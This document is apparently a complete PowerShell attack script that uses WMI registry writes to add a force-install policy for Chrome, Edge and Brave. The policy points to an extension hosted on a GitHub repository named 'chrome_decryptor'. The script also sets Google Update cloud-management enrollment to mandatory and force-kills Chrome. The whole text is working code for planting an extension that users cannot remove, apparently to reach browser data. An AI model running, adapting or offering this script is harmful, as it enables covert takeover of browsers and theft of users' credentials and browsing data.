$extId = "oihkjppelmofdfenjbmbhiamlcejahgm"
$xmlUrl = "https://raw.githubusercontent.com/tn2g4fh-alt/chrome_decryptor/refs/heads/main/update.xml"
$policyValue = "$extId;$xmlUrl"
$HKLM = [uint32]2147483650
$wmi = [WMIClass]"root\default:StdRegProv"

# 1. THE MISSING PIECE: Enable Device Management (Forces policy check)
$mgmtPath = "SOFTWARE\Policies\Google\Update"
$wmi.CreateKey($HKLM, $mgmtPath)
$wmi.SetDwordValue($HKLM, $mgmtPath, "CloudManagementEnrollmentMandatory", 1)

# 2. Re-inject the Force Install Policy
$policyPath = "SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist"
$wmi.CreateKey($HKLM, $policyPath)
$wmi.SetStringValue($HKLM, $policyPath, "1", "$extId;$xmlUrl")

# 3. Restart Chrome to apply
Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue

# 4. Target Google Chrome
$chromePath = "SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist"
$wmi.CreateKey($HKLM, $chromePath)
$wmi.SetStringValue($HKLM, $chromePath, "1", $policyValue)

# 5. Target Microsoft Edge
$edgePath = "SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist"
$wmi.CreateKey($HKLM, $edgePath)
$wmi.SetStringValue($HKLM, $edgePath, "1", $policyValue)

# 5. Target Brave Browser
$bravePath = "SOFTWARE\Policies\BraveSoftware\Brave\ExtensionInstallForcelist"
$wmi.CreateKey($HKLM, $bravePath)
$wmi.SetStringValue($HKLM, $bravePath, "1", $policyValue)
